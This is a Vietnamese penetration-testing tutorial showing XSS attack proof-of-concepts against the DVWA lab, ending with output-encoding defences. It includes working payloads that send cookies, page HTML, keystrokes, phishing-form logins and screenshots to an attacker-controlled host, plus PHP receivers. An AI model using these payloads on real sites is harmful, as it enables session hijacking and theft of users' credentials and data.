Chúng ta hãy cùng khám phá một vài tình huống tấn công thực tế có thể được triển khai dưới dạng PoCs để chứng minh nguy cơ thực sự của các lỗ hổng Cross-Site Scripting (XSS). Là một người kiểm thử sự xâm nhập, bạn muốn khách hàng hiểu được rủi ro của các lỗ hổng mà bạn tìm thấy. Và cách tốt nhất để làm điều này là bằng cách tạo ra các khái niệm chứng minh (proof-of-concept PoCs) có tác động cao trong đó bạn chỉ ra cách những kẻ tấn công có thể khai thác các lỗ hổng và ảnh hưởng đến doanh nghiệp.
Trong bài viết này, chúng ta sẽ xem cách tạo XSS tấn công PoCs để:
1. **Cướp session của người dùng**
2. **Thực hiện các hoạt động trái phép**
3. **Thực hiện các cuộc tấn công lừa đảo**
4. **Nắm bắt các phím chính**
5. **Ăn cắp thông tin nhạy cảm**

## Giới thiệu
**Cross-Site Scripting (XSS)** là một lỗ hổng trong các ứng dụng web và cũng là tên của một cuộc tấn công phía máy khách trong đó kẻ tấn công tiêm và chạy một đoạn mã độc vào một trang web hợp pháp. Các trình duyệt có khả năng hiển thị HTML và thực thi JavaScript. Nếu ứng dụng không loại bỏ các ký tự đặc biệt trong đầu vào / đầu ra và thể hiện đầu vào của người dùng khi quay lại trình duyệt, một kẻ thù có thể thực hiện một cuộc tấn công XSS (Cross-Site Scripting) thành công.
Bạn có thể tìm thêm thông tin về lỗ hổng này trong trang  [OWASP’s Cross-Site Scripting](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)).
Đối với mục đích demo, ta sẽ sử dụng ứng dụng DVWA nổi tiếng mà chúng ta nên cài đặt trước. Bạn có thể cài đặt theo các link: [Youtube](https://www.youtube.com/watch?v=yYUj9UN5Nus) hoặc [Tại đây](https://medium.com/datadriveninvestor/setup-install-dvwa-into-your-linux-distribution-d76dc3b80357).
Trang DVWA http://localhost:81/DVWA/vulnerabilities/xss_r/ bị ảnh hưởng bởi XSS được phản ánh trong tham số **name**. Điều này có thể được nhìn thấy trong hình bên dưới khi chúng ta tiêm mã JavaScript **<script>alert(123)</script>** và nó được phản ánh và thực thi trong trang response.

![alt](https://images.viblo.asia/75645da5-425d-4486-81d6-ba6c68965dd3.png)
## XSS Attack 1: Chiếm phiên người dùng
Hầu hết các ứng dụng web duy trì **phiên người dùng** để xác định người dùng qua nhiều yêu cầu HTTP . Phiên (session) được xác định bởi session cookies. Ví dụ: sau khi đăng nhập thành công vào một ứng dụng, máy chủ sẽ gửi cho bạn session cookie theo **Set-Cookie** header. Bây giờ, nếu bạn muốn truy cập bất kỳ trang nào trong ứng dụng hoặc gửi biểu mẫu, cookie (hiện được lưu trữ trong trình duyệt) cũng sẽ được bao gồm trong tất cả các yêu cầu được gửi đến máy chủ. Bằng cách này, máy chủ sẽ biết bạn là ai.
Do đó, session cookie là thông tin nhạy cảm, nếu bị xâm nhập, có thể cho phép kẻ tấn công mạo danh người dùng hợp pháp và có quyền truy cập vào phiên web hiện tại của anh ta. Cuộc tấn công này được gọi là tấn công phiên **(session hijacking)**. Mã JavaScript đang chạy trong trình duyệt có thể truy cập session cookie (khi chúng thiếu HTTPOnly) bằng cách gọi document.cookie. Vì vậy, nếu chúng ta tiêm khối mã sau vào tham số **name**, trang dễ bị tấn công sẽ hiển thị giá trị cookie hiện tại trong khối cảnh báo:

```
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>alert(document.cookie)</script>
```

![alt](https://images.viblo.asia/52280d9c-3648-49d5-9078-75e92057f94a.png)
Bây giờ, để đánh cắp cookie, chúng ta phải cung cấp một đoạn sẽ gửi giá trị cookie đến trang web do kẻ tấn công kiểm soát.
Đoạn mã sau đây sẽ tạo một đối tượng Image mới trong DOM của trang hiện tại và đặt thuộc tính src link đến trang của kẻ tấn công. Do đó, trình duyệt sẽ thực hiện yêu cầu HTTP đến trang web bên ngoài này (192.168.149.128) và URL sẽ chứa cookie phiên.

```
<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
```
Vì vậy, đây là URL tấn công sẽ gửi cookie đến máy chủ của chúng ta: 

```
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
```
Khi trình duyệt nhận được yêu cầu này, nó sẽ thực thi đoạn JavaScript, thực hiện một yêu cầu mới tới 192.168.149.128, cùng với giá trị cookie trong URL, như được hiển thị bên dưới.

![alt](https://images.viblo.asia/a9b8aa63-3bac-4294-919c-bef027a37f84.png)
Nếu chúng ta nhìn kết nối đến trên máy chủ do kẻ tấn công kiểm soát (192.168.149.128), chúng ta có thể thấy một yêu cầu đến với các giá trị cookie ( **security** và **PHPSESSID** ) được thêm vào URL. Thông tin tương tự có thể được tìm thấy trong tệp access.log trên server.

![alt](https://images.viblo.asia/54125977-e7c3-4048-a03a-4ffc2e3bb2fa.png)
### Sử dụng cookie đã ăn cắp
Với thông tin cookie ở trên, nếu chúng ta truy cập bất kỳ trang nội bộ nào của ứng dụng và nối thêm giá trị cookie trong yêu cầu, chúng ta có thể truy cập trang thay mặt cho nạn nhân, trong phiên riêng của mình (mà không cần biết tên người dùng và mật khẩu). Về cơ bản, chúng ta đã chiếm quyền điều khiển phiên của người dùng.

![alt](https://images.viblo.asia/481e9021-565d-4f56-8045-e3440990a701.png)
![alt](https://images.viblo.asia/33214b2a-3977-4532-a914-fd84ad989431.png)
![alt](https://images.viblo.asia/ace6c0da-1ae9-4af5-80df-e1b461b2630e.png)
Thuộc tính **HttpOnly Cookie** có thể giúp giảm thiểu tình huống này bằng cách ngăn chặn truy cập vào các giá trị cookie thông qua JavaScript. Nó có thể được đặt khi khởi tạo giá trị cookie (thông qua **Set-Cookie** header).
## XSS Attack 2: Thực hiện các hoạt động trái phép
Nếu thuộc tính **HTTPOnly Cookie** được đặt, chúng ta không thể đánh cắp cookie thông qua JavaScript. Tuy nhiên, bằng cách sử dụng cuộc tấn công XSS, chúng ta vẫn có thể thực hiện các hành động trái phép bên trong ứng dụng thay mặt cho người dùng. Chẳng hạn, trong kịch bản tấn công này, chúng ta sẽ đăng một tin nhắn mới trong Guestbook dưới danh nghĩa người dùng mà không có sự đồng ý của anh ta. Đối với điều này, chúng ta cần giả mạo một yêu cầu POST HTTP đến trang Guestbook với các tham số thích hợp với JavaScript.
Đoạn mã sau sẽ làm điều này bằng cách tạo một đối tượng **XMLHTTPRequest** và đặt tiêu đề và dữ liệu cần thiết:

```
<script>
	var xhr = new XMLHttpRequest();
	xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
	xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
	xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
</script>
```
Đây là cách yêu cầu trông giống như trong trình duyệt và cũng bị chặn trong Burp.

![alt](https://images.viblo.asia/56ddb8c5-3a24-43bc-83b2-530d439d1bcf.png)
![alt](https://images.viblo.asia/2339dfb6-77bd-426e-abdf-0873b17d5fc5.png)
Kịch bản thực thi sẽ tạo ra một yêu cầu mới để thêm nhận xét thay mặt cho người dùng.

![alt](https://images.viblo.asia/55c4a5cd-738b-413c-861f-dee3bce2dc37.png)
![alt](https://images.viblo.asia/5edd130e-6626-4a0c-a38c-feb7f8e16b10.png)
## XSS Attack 3: Đánh cắp thông tin đăng nhập của người dùng
XSS cũng có thể được sử dụng để đưa một biểu mẫu vào trang dễ bị tấn công và sử dụng biểu mẫu này để thu thập thông tin đăng nhập của người dùng. Kiểu tấn công này được gọi là **phishing**.
Đoạn mã bên dưới sẽ thêm một biểu mẫu với thông báo ***Please login to proceed***, cùng với các trường **username** và **password**.
Khi truy cập vào liên kết dưới đây, nạn nhân có thể nhập thông tin đăng nhập. Lưu ý rằng chúng ta có thể sửa đổi code để làm cho nó trông giống một form hợp lệ như chúng ta muốn.

```
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```
![alt](https://images.viblo.asia/2d692e58-c022-43b3-b9eb-016c88daf31e.png)
Khi người dùng nhập thông tin đăng nhập của họ và nhấp vào nút ***Login*** , yêu cầu được gửi đến máy chủ do kẻ tấn công kiểm soát. Yêu cầu có thể được nhìn thấy trong các ảnh chụp màn hình dưới đây:

![alt](https://images.viblo.asia/4918d7dd-96d2-4824-873b-28eb8c835571.png)
Thông tin đăng nhập được nhập của người dùng (pentest: pentest) có thể được nhìn thấy trên máy chủ nhận.

![alt](https://images.viblo.asia/3b0f6020-8d7a-49df-a6b7-de7efce07392.png)
## XSS Attack 4: Nắm bắt các phím bằng cách tiêm keylogger
Trong kịch bản tấn công này, chúng tôi sẽ đưa một keylogger JavaScript vào trang web dễ bị tấn công và chúng tôi sẽ nắm bắt tất cả các phím của người dùng trong trang hiện tại. Trước hết, chúng tôi sẽ tạo một tệp JavaScript riêng và chúng tôi sẽ lưu trữ nó trên máy chủ do kẻ tấn công kiểm soát. Chúng tôi cần tệp này vì code quá lớn để được chèn vào URL và chúng tôi tránh mã hóa và thoát các lỗi. Tệp JavaScript (xss.js trong /var/www/html) chứa mã sau đây: 

```
document.onkeypress = function(evt) {
  evt = evt || window.event
  key = String.fromCharCode(evt.charCode)
  if (key) {
    var http = new XMLHttpRequest();
    var param = encodeURI(key);
    http.open("POST", "http://192.168.149.128/keylog.php", true);
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send("key=" + param);
  }
}
```
Mỗi lần nhấn phím, một yêu cầu XMLHttp mới được tạo và gửi tới trang **keylog.php** được lưu trữ tại máy chủ do kẻ tấn công kiểm soát. Mã trong **keylog.php** (trong /var/www/html) ghi giá trị của các phím được nhấn vào một tệp có tên **data.txt**.

```
<?php
if (!empty($_POST["key"])) {
  $logfile = fopen("data.txt", "a+");
  fwrite($logfile, $_POST["key"]);
  fclose($logfile);
}
?>
```
Bây giờ chúng ta cần gọi trang dễ bị tấn công với code từ máy chủ của chúng tôi:

```
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">
```
Khi tập lệnh được tải, một yêu cầu mới sẽ được đưa ra với mỗi charCode của bất kỳ phím nào.

![alt](https://images.viblo.asia/bdc0daec-2869-4878-8a19-1a1931e3e6e7.png)
Giá trị của tham số **key** đang được ghi vào tệp **data.txt** , như được hiển thị trong ảnh chụp màn hình bên dưới.

![alt](https://images.viblo.asia/a33ba3c0-d272-4aae-83c6-4b987627bf4d.png)
## XSS Attack 5: Đánh cắp thông tin nhạy cảm
Một hành động độc hại khác có thể được thực hiện với một cuộc tấn công XSS là đánh cắp thông tin nhạy cảm từ phiên hiện tại của người dùng. Hãy tưởng tượng rằng một ứng dụng ngân hàng internet dễ bị tấn công bởi XSS, kẻ tấn công có thể đọc số dư hiện tại, thông tin giao dịch, dữ liệu cá nhân, v.v. Đối với kịch bản này, chúng ta cần tạo một tệp JavaScript trên máy chủ do kẻ tấn công kiểm soát. Tệp chứa logic chụp ảnh màn hình của trang nơi tập lệnh đang chạy:

![alt](https://images.viblo.asia/a1a15164-62a1-46bf-ab10-125462fbe7ae.png)
Sau đó, chúng ta cần tạo một tệp PHP trên máy chủ của kẻ tấn công, để lưu nội dung của tham số **png** vào tệp **test.png**.

```
<?php
$data = $_POST["png"];
$data = substr($data, 22);
$f = fopen("test.png", "w+");
fputs($f, base64_decode($data));
fclose($f);
?>
```
Bây giờ chúng ta tiêm mã JavaScript vào trang dễ bị tấn công bằng cách lừa người dùng truy cập URL sau:

```
http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/screenshot.js">
```
Khi tệp JavaScript được tải, tập lệnh sẽ gửi dữ liệu ở định dạng base64 đến tệp **saveshot.php** để ghi dữ liệu vào tệp **test.png**. Khi mở tệp test.png, chúng ta có thể thấy ảnh chụp màn hình của trang dễ bị tấn công.

![alt](https://images.viblo.asia/22d7faae-77b3-46b7-8a53-1249dc60a252.png)
## Cách khác
Một cách khác để đánh cắp nội dung trang sẽ là lấy mã nguồn HTML bằng cách sử dụng **getElementById**. Đây là khối mã lấy ***innerHTML*** của phần tử ***guestbookcomments*** và gửi nó đến những kẻ tấn công.

```
<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.getElementById('guestbook_comments').innerHTML;</script>
```
![alt](https://images.viblo.asia/10beaa8e-da22-4248-9286-950044f6eeba.png)
Chúng tôi cũng có thể tìm nạp toàn bộ nguồn trang của trang bằng cách sử dụng đoạn code sau:

```
<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.body.innerHTML</script>
```
![alt](https://images.viblo.asia/88b23f76-8e6c-42a4-a8c9-514a1eed17a9.png)
![alt](https://images.viblo.asia/cc12307c-5d1b-437d-ae16-2f7f4b097bb2.png)
Giải mã dữ liệu nhận được trong **Burp Debugger** cung cấp cho chúng ta nguồn trang rõ ràng của trang dễ bị tấn công. Ở đây, chúng ta có thể xem các bình luận của Guestbook. Bạn có thể xem và cài đặt theo [link sau](https://tutorialsoverflow.com/how-to-install-and-configure-burp-suite-on-ubuntu-18-04/).

![alt](https://images.viblo.asia/e6ace8ff-03c7-4ac4-8b4f-c39ca410b90b.png)
## Kết luận
Tùy thuộc vào chức năng và dữ liệu được xử lý bởi ứng dụng dễ bị tấn công, các lỗ hổng XSS có thể gây rủi ro đáng kể cho doanh nghiệp. Kẻ tấn công có thể đánh cắp thông tin bí mật, thực hiện các hoạt động trái phép và chiếm đoạt toàn bộ phiên web của người dùng.
Cách bảo vệ tốt nhất chống lại kiểu tấn công này là xử lí đầu ra, nghĩa là mọi dữ liệu nhận được từ phía khách hàng phải được xử lí trước khi được trả lại trong trang phản hồi. Việc xử lí được thực hiện bằng cách chuyển đổi các ký tự HTML đặc biệt thành các thực thể HTML tương đương của chúng, chẳng hạn như:

```
< ---> &lt;
> ---> &gt;
" ---> &quot;
' ---> &apos;
```
Nên sử dụng các hàm có sẵn của mọi ngôn ngữ lập trình được thiết kế để thực hiện xử lí. Ví dụ, trong PHP bạn nên sử dụng [htmlentity](https://www.php.net/manual/ro/function.htmlentities.php), trong javascript là [encodeURI](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURI),  trong ruby là [escapeHTML](https://apidock.com/ruby/CGI/escapeHTML/class).
Thông tin thêm về bảo vệ chống lại XSS có thể được tìm thấy trong [OWASP’s XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet).
Nguồn tham khảo: [https://pentest-tools.com/blog/xss-attacks-practical-scenarios/](https://pentest-tools.com/blog/xss-attacks-practical-scenarios/)